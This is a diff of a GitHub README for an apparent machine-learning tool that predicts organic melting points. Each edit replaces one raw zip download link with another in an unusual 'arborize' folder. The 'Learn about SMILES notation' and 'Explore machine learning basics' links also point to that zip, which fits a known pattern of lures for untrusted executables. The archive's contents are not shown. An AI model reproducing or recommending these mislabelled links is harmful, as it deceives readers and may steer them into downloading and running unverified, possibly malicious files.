@@ -1,6 +1,6 @@
 # 🔥 Melting-Point-Prediction-Using-Ensemble-ML - Predict Organic Melting Points Easily
 
-[![Download Melting Point Predictor](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Melting-Point-Prediction-Using-Ensemble-ML_1.0.zip%20Point%20Predictor-blue)](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Melting-Point-Prediction-Using-Ensemble-ML_1.0.zip)
+[![Download Melting Point Predictor](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Ensemble_Melting_Point_ML_Using_Prediction_v2.2.zip%20Point%20Predictor-blue)](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Ensemble_Melting_Point_ML_Using_Prediction_v2.2.zip)
 
 ## 🌟 Overview
 
@@ -21,7 +21,7 @@ To get started, follow these instructions. The process is straightforward and us
 
 To download the application, visit the following link:
 
-[Click here to download the Melting Point Predictor](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Melting-Point-Prediction-Using-Ensemble-ML_1.0.zip)
+[Click here to download the Melting Point Predictor](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Ensemble_Melting_Point_ML_Using_Prediction_v2.2.zip)
 
 Once you reach the page, look for the latest version. You will find files available for direct download. Choose the appropriate file for your operating system, then click to download.
 
@@ -64,7 +64,7 @@ If you encounter any issues, please reach out via the GitHub discussion page or 
 
 ## 🔍 Additional Resources
 
-- [Learn about SMILES notation](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Melting-Point-Prediction-Using-Ensemble-ML_1.0.zip)
-- [Explore machine learning basics](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Melting-Point-Prediction-Using-Ensemble-ML_1.0.zip)
+- [Learn about SMILES notation](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Ensemble_Melting_Point_ML_Using_Prediction_v2.2.zip)
+- [Explore machine learning basics](https://raw.githubusercontent.com/mr1139/Melting-Point-Prediction-Using-Ensemble-ML/main/arborize/Ensemble_Melting_Point_ML_Using_Prediction_v2.2.zip)
 
 Thank you for using the Melting Point Prediction Tool. We hope it enhances your research and learning in chemistry!
